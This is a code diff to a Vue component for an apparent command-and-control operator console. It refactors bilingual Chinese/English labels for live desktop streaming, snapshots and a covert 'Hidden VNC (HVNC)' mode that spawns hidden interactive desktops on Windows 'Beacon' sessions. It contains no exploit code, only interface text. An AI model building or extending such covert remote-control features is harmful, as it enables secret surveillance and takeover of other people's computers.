@@ -4,19 +4,19 @@
     <div class="mv-toolbar">
       <div class="mv-title-group">
         <el-icon class="mv-title-icon"><Monitor /></el-icon>
-        <span class="mv-title">{{ isZh ? '屏幕实时监控: ' : 'Desktop: ' }}{{ currentClientTitle }}</span>
+        <span class="mv-title">{{ i18nStore.tl('屏幕实时监控: ', 'Desktop: ') }}{{ currentClientTitle }}</span>
         <span class="mv-status" :class="isMonitoring || hvncActive ? 'is-on' : 'is-off'">
-          {{ (isMonitoring || hvncActive) ? (isZh ? '● 实时推流中' : '● Live Streaming') : (isZh ? '● 未启动' : '● Idle') }}
+          {{ (isMonitoring || hvncActive) ? (i18nStore.tl('● 实时推流中', '● Live Streaming')) : (i18nStore.tl('● 未启动', '● Idle')) }}
         </span>
       </div>
 
       <div class="mv-spacer" />
 
       <!-- Mode Selector -->
-      <span class="mv-label">{{ isZh ? '模式:' : 'Mode:' }}</span>
+      <span class="mv-label">{{ i18nStore.tl('模式:', 'Mode:') }}</span>
       <el-select v-model="monitorMode" style="width: 120px">
-        <el-option :label="isZh ? '屏幕流' : 'Stream'" value="normal" />
-        <el-option :label="isZh ? 'HVNC (隐蔽)' : 'HVNC'" value="hvnc" :disabled="isLinuxClient" />
+        <el-option :label="i18nStore.tl('屏幕流', 'Stream')" value="normal" />
+        <el-option :label="i18nStore.tl('HVNC (隐蔽)', 'HVNC')" value="hvnc" :disabled="isLinuxClient" />
       </el-select>
     </div>
 
@@ -30,7 +30,7 @@
         @click="toggleMonitoring"
       >
         <el-icon :class="{ 'is-loading': isConnecting }"><VideoPlay v-if="!isMonitoring" /><VideoPause v-else /></el-icon>
-        <span>{{ isMonitoring ? (isZh ? '停止推流' : 'Stop Stream') : (isZh ? '开始推流' : 'Start Stream') }}</span>
+        <span>{{ isMonitoring ? (i18nStore.tl('停止推流', 'Stop Stream')) : (i18nStore.tl('开始推流', 'Start Stream')) }}</span>
       </button>
 
       <button
@@ -40,7 +40,7 @@
         @click="captureCurrentFrame"
       >
         <el-icon><Camera /></el-icon>
-        <span>{{ isZh ? '截图留存' : 'Snapshot' }}</span>
+        <span>{{ i18nStore.tl('截图留存', 'Snapshot') }}</span>
       </button>
 
       <button
@@ -50,21 +50,21 @@
         :disabled="hvncConnecting || isLinuxClient"
         @click="hvncActive ? stopHvnc() : startHvnc()"
       >
-        <span>{{ hvncActive ? (isZh ? '停止 HVNC' : 'Stop HVNC') : (isZh ? '启动 HVNC' : 'Start HVNC') }}</span>
+        <span>{{ hvncActive ? (i18nStore.tl('停止 HVNC', 'Stop HVNC')) : (i18nStore.tl('启动 HVNC', 'Start HVNC')) }}</span>
       </button>
 
       <span class="mv-action-sep" />
 
       <button class="cs-btn" :disabled="!streamUrl" @click="zoomReset">
-        {{ isZh ? '重置比例 1:1' : 'Zoom 1:1' }}
+        {{ i18nStore.tl('重置比例 1:1', 'Zoom 1:1') }}
       </button>
 
       <button class="cs-btn" @click="toggleFullscreen">
-        {{ isFullscreen ? (isZh ? '退出全屏' : 'Exit Fullscreen') : (isZh ? '全屏查看' : 'Fullscreen') }}
+        {{ isFullscreen ? (i18nStore.tl('退出全屏', 'Exit Fullscreen')) : (i18nStore.tl('全屏查看', 'Fullscreen')) }}
       </button>
 
       <button class="cs-btn" @click="handleHelp">
-        {{ isZh ? '帮助' : 'Help' }}
+        {{ i18nStore.tl('帮助', 'Help') }}
       </button>
     </div>
 
@@ -85,7 +85,7 @@
 
           <!-- Live OSD Overlay -->
           <div class="mv-osd-badge">
-            <span>FPS: {{ currentFps }} | {{ isZh ? '延迟' : 'Latency' }}: {{ latency }}ms | {{ currentTime }}</span>
+            <span>FPS: {{ currentFps }} | {{ i18nStore.tl('延迟', 'Latency') }}: {{ latency }}ms | {{ currentTime }}</span>
           </div>
 
           <!-- Floating Zoom Controls -->
@@ -101,8 +101,8 @@
           <EmptyState
             icon="🖥"
             variant="inline"
-            :title="isZh ? '桌面监控推流未启动' : 'Desktop Stream Inactive'"
-            :desc="isZh ? '点击【开始推流】启动被控端桌面实时推流画面。' : 'Click [ Start Stream ] to begin live desktop monitoring.'"
+            :title="i18nStore.tl('桌面监控推流未启动', 'Desktop Stream Inactive')"
+            :desc="i18nStore.tl('点击【开始推流】启动被控端桌面实时推流画面。', 'Click [ Start Stream ] to begin live desktop monitoring.')"
           />
         </div>
       </template>
@@ -123,7 +123,7 @@
             @contextmenu.prevent
           />
           <div class="mv-osd-badge">
-            <span>{{ isZh ? `HVNC 已激活 (${hvncSid}) - 点击画布聚焦以交互操作` : `HVNC Active (${hvncSid}) - Focus canvas to inject inputs` }}</span>
+            <span>{{ i18nStore.tl(`HVNC 已激活 (${hvncSid}) - 点击画布聚焦以交互操作`, `HVNC Active (${hvncSid}) - Focus canvas to inject inputs`) }}</span>
           </div>
         </div>
 
@@ -131,10 +131,10 @@
           <EmptyState
             icon="🪟"
             variant="inline"
-            :title="isZh ? '隐蔽桌面 (HVNC)' : 'Hidden VNC (HVNC) Desktop'"
+            :title="i18nStore.tl('隐蔽桌面 (HVNC)', 'Hidden VNC (HVNC) Desktop')"
             :desc="isLinuxClient
-              ? (isZh ? 'HVNC 仅支持 Windows 目标会话。' : 'HVNC is only supported on Windows Beacon sessions.')
-              : (isZh ? '点击【启动 HVNC】创建隐蔽交互式 Windows 桌面会话。' : 'Click [ Start HVNC ] to spawn a hidden interactive Windows desktop session.')"
+              ? (i18nStore.tl('HVNC 仅支持 Windows 目标会话。', 'HVNC is only supported on Windows Beacon sessions.'))
+              : (i18nStore.tl('点击【启动 HVNC】创建隐蔽交互式 Windows 桌面会话。', 'Click [ Start HVNC ] to spawn a hidden interactive Windows desktop session.'))"
           />
         </div>
       </template>
